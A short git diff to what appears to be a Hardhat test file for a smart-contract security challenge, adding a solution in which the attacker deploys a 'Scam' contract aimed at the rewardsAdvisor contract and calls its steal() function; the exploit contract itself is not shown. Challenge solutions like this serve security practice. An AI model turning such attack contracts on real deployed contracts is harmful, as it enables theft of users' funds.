@@ -14,6 +14,7 @@ let adminUser: Signer; // should not be used
 let govToken: Contract;
 let rewardsAdvisor: Contract;
 let farm: Contract; // farm token
+let scam: Contract;
 
 /// preliminary state
 before(async () => {
@@ -49,6 +50,14 @@ before(async () => {
 it("solves the challenge", async function () {
 
   // implement solution here
+
+  let scamFactory = await ethers.getContractFactory('Scam')
+  scam = await scamFactory.connect(attacker).deploy(rewardsAdvisor.address)
+
+  // await scam.connect(attacker).owner(scam)
+
+  await scam.steal()
+
 
 });
 
